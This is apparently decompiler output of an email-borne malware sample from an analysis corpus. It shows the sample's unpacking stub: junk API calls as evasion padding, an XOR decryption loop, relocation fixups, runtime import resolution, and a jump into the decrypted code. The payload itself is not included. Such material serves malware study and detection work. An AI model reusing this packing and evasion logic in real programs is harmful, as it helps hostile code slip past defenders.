// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0106/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 ecx, word32 ebx)
{
fn00401000_entry:
l00401000:
	Eq_2 * edi_385 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + 0x00000025 + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	Eq_2 * ebp_16 = null
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040111F
l0040111C:
	edi_385 = edi_385 - 0x00000022;
l0040111F:
	Eq_245 * eax_394 = null
l00401121:
	branch ebp_16 != edi_385 l00401127
l00401125:
	ebp_16 = null;
l00401127:
	byte v14_416 = eax_394->b401290 ^ ebp_16->b404000
	eax_394->b401290 = v14_416;
	eax_394 = eax_394 + 1;
	ebp_16 = ebp_16 + 1;
	branch eax_394 <u (Eq_245 *) 0x00001420 l00401121
l00401146:
	Eq_268 * edx_425 = &globals->t402570
	up32 dwLoc08_430 = 0x00000000
l00401167:
	word32 eax_437 = edx_425->dw0004
	Eq_297 * ecx_443 = &edx_425->t0008
	branch eax_437 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004011A9
l00401176:
	uint32 esi_615 = eax_437 - 0x00000008 >>u 0x00000001
l00401180:
	branch (ecx_443->w0000 & 0xF000) != 0x3000 l004011A1
l00401190:
	Eq_410 * eax_636 = ((word32) ecx_443->w0000 & 0x00000FFF) + edx_425->dw0000
	eax_636->dw401010 = eax_636->dw401010 + 0xF0401010;
l004011A1:
	ecx_443 = ecx_443 + 1;
	esi_615 = esi_615 - 0x00000001;
	branch esi_615 != 0x00000000 l00401180
l004011A9:
	word32 eax_450 = edx_425->dw0004
	up32 ecx_452 = dwLoc08_430 + eax_450
	Eq_278 * edx_453 = edx_425 + eax_450
	branch ecx_452 <u 0x000000E4 l00401167
	word32 eax_457 = edx_453->dw0004
	up32 ecx_459 = ecx_452 + eax_457
	edx_425 = edx_453 + eax_457;
	dwLoc08_430 = ecx_459;
	branch ecx_459 <u 0x000000E4 l00401167
l004011C0:
	branch globals->dw401D7C == 0x00000000 l0040124A
	Eq_318 * ebx_469 = &globals->t401D6C
	Eq_318 * dwLoc04_470 = &globals->t401D6C
	ebx_498 = ebx_469;
	branch globals->dw401D7C == 0x00000000 l0040124A
l004011D3:
	Eq_318 * ebx_498
	Eq_336 eax_503 = LoadLibraryA(ebx_498->dw000C + 0x00401010)
	CloseHandle(0x00000062)
	branch eax_503 == 0x00000000 l0040123D
	Eq_336 eax_518 = LoadLibraryA(ebx_498->dw000C + 0x00401010)
	CloseHandle(0x00000062)
	branch eax_518 == 0x00000000 l0040123D
l004011F1:
	branch ebx_498->ptr0000 != null l004011FA
	Eq_370 * edi_550 = ebx_498->ptr0000
	branch edi_550 != null l004011FA
l004011F7:
	edi_550 = ebx_498->ptr0010;
l004011FA:
	Eq_384 eax_556 = edi_550->u401010
	Eq_388 * edi_558 = &edi_550->u401010
	word32 esi_559 = Mem417[ebx_498 + 0x00000010:word32] + 0x00401010
	byte S_562 = cond(eax_556)
	branch eax_556 == 0x00000000 l0040123D
l00401208:
	Eq_428 dwLoc1C_585
	Eq_336 dwLoc20_581
	branch S_562 l00401215
l0040120A:
	dwLoc1C_585 = (word32) edi_558->t0000;
	dwLoc20_581 = eax_518;
	goto l00401222
l00401215:
	dwLoc1C_585.u0 = eax_556.u1;
	dwLoc20_581 = eax_518;
l00401222:
	esi_559->dw0000 = GetProcAddress(dwLoc20_581, dwLoc1C_585);
	edi_558 = edi_558 + 1;
	eax_556 = edi_558->t0000;
	esi_559 = esi_559 + 1;
	S_562 = cond(eax_556);
	branch eax_556 != 0x00000000 l00401208
l00401239:
	ebx_498 = dwLoc04_470;
l0040123D:
	ebx_498 = ebx_498 + 1;
	dwLoc04_470 = ebx_498;
	branch ebx_498->ptr0010 != null l004011D3
l0040124A:
	0x00401A60()
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

